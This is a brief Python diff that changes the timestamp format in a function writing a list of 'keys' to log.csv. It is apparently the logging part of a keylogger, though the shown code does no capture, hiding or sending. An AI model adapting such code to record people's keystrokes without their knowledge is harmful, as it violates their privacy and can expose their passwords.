@@ -17,7 +17,7 @@ def write_file(keys):
     with open('log.csv', 'a') as f:  
         for key in keys:
             k = str(key).replace("'", "")
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]  
+            timestamp = datetime.now()
             f.write(f'{timestamp} {k}\n')
         keys.clear()  
 
